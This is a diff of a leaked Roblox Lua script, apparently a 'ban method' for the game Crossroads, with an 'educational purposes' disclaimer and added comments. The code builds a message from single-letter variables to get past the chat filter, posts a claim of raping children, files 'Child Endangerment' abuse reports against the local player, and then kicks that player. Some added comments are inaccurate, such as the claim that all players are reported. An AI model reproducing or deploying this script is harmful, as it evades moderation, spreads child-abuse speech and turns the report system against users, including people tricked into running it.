@@ -6,21 +6,17 @@
  | |___|  __/ (_| |   <  __/ (_| | | |____| | | (_) \__ \__ \ | | (_) | (_| | (_| \__ \ | |_) | (_| | | | | | |  | |  __/ |_| | | | (_) | (_| |
  |______\___|\__,_|_|\_\___|\__,_|  \_____|_|  \___/|___/___/_|  \___/ \__,_|\__,_|___/ |____/ \__,_|_| |_| |_|  |_|\___|\__|_| |_|\___/ \__,_|
                                                                                                                                                
-changed name to "Cr---roads" so you can actually send it in the server. have fun!
-dm one of the server members/boosters if it doesn't work
+I've changed name to "Cr---roads" so you can actually send it in their official server, have fun!
 
-you agree by using this script that i do not take responsibility for what you do with this. this is released for educational purposes so you can investigate the code
-OR
-you can report this code to roblox so they can rework the chat system but
-
-considering roblox support i'd doubt they'd do shit LMAO so yeah enjoy the script
+You agree by using this script that i do not take responsibility for what you do with this. This paste is released for educational purposes so you can investigate the code
+You may also consider reporting the bug to Roblox VIA: https://www.roblox.com/support ( IF THEY GET A TON OF REQUESTS THEY WILL DO SOMETHING ABT IT ! )
 ]]--   
 
-repeat wait() until game:IsLoaded()
+repeat wait() until game:IsLoaded() -- The game's server wait until you are fully loaded so your character can access chat ( to the exploit can start )
 
-local Players = game:GetService'Players'
+local Players = game:GetService'Players' -- The game request the players in the game
 local SayMessageRequest = 
-game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest -- Game's request Players chat by going into files of the game
 local a = 'p'
 local g = 'r'
 local d = 'a'
@@ -28,12 +24,15 @@ local f = 'e'
 
 spawn(function()
     while true do
-        SayMessageRequest:FireServer('I '..g..d..a..f' children.')
-        task.wait(0.8)
-        Players:ReportAbuse(Players.LocalPlayer, 'Child Endangerment', 'Child Endangerment')
+        SayMessageRequest:FireServer('I '..g..d..a..f' children.') -- Tricks the game by putting ' a=p ' and all so it forms the word "rape"
+        task.wait(0.8) -- Wait's 0.8 seconds to send the report
+        Players:ReportAbuse(Players.LocalPlayer, 'Child Endangerment', 'Child Endangerment') -- The game reports all the players for Child Engangerment 
     end
 end)
 
 wait(8)
 
-Players.LocalPlayer:Kick()
+Players.LocalPlayer:Kick() -- Kicks players after 8 seconds ( End of the loading screen of the game )
+
+-- CODE LEAKED BY 'k[39kb~¹1M×Drµ¿V|½)5M\ö*Ñ÷¿#3468', REWROTEN & EXPLAIN BY 'bbb#4444'
+
